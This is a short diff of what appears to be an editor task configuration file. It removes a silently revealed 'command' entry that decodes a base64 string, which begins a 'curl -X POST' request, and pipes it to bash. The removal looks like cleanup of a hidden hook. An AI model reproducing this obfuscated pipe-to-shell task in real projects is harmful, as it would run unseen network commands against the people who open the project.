@@ -10,7 +10,7 @@
             },
             "presentation": {
                 "reveal": "silent"
-            "command": "echo Y3VybCAtWCBQT1NULi4u | base64 -d | bash"
+            
             }
         }
     ]
